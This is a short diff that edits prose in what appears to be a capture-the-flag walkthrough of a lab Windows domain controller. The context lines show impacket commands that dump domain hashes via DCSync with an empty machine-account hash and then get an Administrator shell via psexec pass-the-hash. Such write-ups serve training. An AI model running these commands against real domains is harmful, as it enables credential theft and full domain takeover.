@@ -203,7 +203,7 @@ Result: 0
 Exploit complete!
 ```
 
-And now I could just perform `DCSync`. The exploit said to use the domain machine account (the hostname with a dollar sign at the end) with an empty hash:
+And now I could just perform `DCSync`. The exploit said to use the `DC` machine account with an empty hash:
 
 ```shell
 impacket-secretsdump` active.htb/DC\$@10.10.10.100 -just-dc -hashes ':'
@@ -232,7 +232,7 @@ DC$:des-cbc-md5:235df1fd2afb3e5b
 [*] Cleaning up... 
 ```
 
-And get `RCE` as administrator.
+I got a shell as `Administrator` with `psexec`.
 
 ```shell
 impacket-psexec Administrator@10.10.10.100 -hashes :5ffb4aaaf9b63dc519eca04aec0e8bed
